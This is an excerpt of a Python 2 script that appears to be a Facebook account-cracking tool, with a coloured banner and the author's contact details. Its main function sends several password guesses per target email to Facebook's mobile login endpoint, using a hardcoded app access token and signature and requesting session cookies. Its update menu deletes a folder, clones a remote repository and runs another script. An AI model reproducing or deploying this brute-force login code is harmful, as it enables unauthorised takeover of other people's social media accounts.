...
\033[1;94m ┈┈┈▕▕B4 H4▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕4N J4▏▏┈┈┈

\033[1;94m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈

\033[1;94m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;94mBhanjadadrii.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈

\033[1;96m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈

\033[1;96m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲

\033[1;96m................\033[1;93mBhajadadrii\033[1;91m...............

\033[1;96m................\033[1;93m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............

\033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

\033[1;91m☞ Auther     : Bhanjadadrii

\033[1;92m☞ WhatsApp   : +1 (289) 800-2034

\033[1;95m☞ Facebook    : https://www.facebook.com/profile.php?id=100052283833565
...
def login():
	...
	try:
		...
		if 'access_token' in z:
		    ...
		    os.system('xdg-open https://www.facebook.com/profile.php?id=100052283833565')
...
def menu():
	...
	print (S + '[' + P + '☞2' + S + ']' + S + ' Update Bhanjadadrii Tool')

	print (S + '[' + P + '☞3' + S + ']' + S + ' BhanjadariiGroup')
...
def mb():
	...
	if bm =='':
	    ...
	    os.system('rm -rf $HOME/BH4NJ4')

	    os.system('cd $HOME && git clone https://github.com/bhanjadadrii/dadrii')
	    ...
	    psb('WhatsApp Num +(289) 800-2034✓')

	    psb('WellCome To Bhanjadadrii')

	    psb('Congratulations Bhanjadadrii Tool Has Been Updated Successfully')

	    psb('🔓User Name☆ bhanja✓')

	    psb('🔓Password ☆ dadrii✓')

	    psb('My Whatsapp +1(289) 800-2034')

	    psb('Please Login Again')

	    time.sleep(2)

	    os.system('cd $HOME/BH_anja && python2 BH.py')

	elif bm =='3':

	    os.system('xdg-open Follow this link to join my WhatsApp group: https://chat.whatsapp.com/Bu0f2Qgy5uhANNYSipcxMX')
...
def pb():
	...
	def main(arg):
		...
		try:
			...
			dt=urllib.urlopen('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			...
			if 'www.facebook.com' in k['error_msg']:
			    ...
			    if 'access_token' in k:
			        ...
			        dt=urllib.urlopen('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			        ...
			        if 'www.facebook.com' in k['error_msg']:
			            ...
			            if 'access_token' in k:
			                ...
			                dt=urllib.urlopen('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                ...
			                if 'www.facebook.com' in k['error_msg']:
			                    ...
			                    if 'access_token' in k:
			                        ...
			                        dt=urllib.urlopen('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
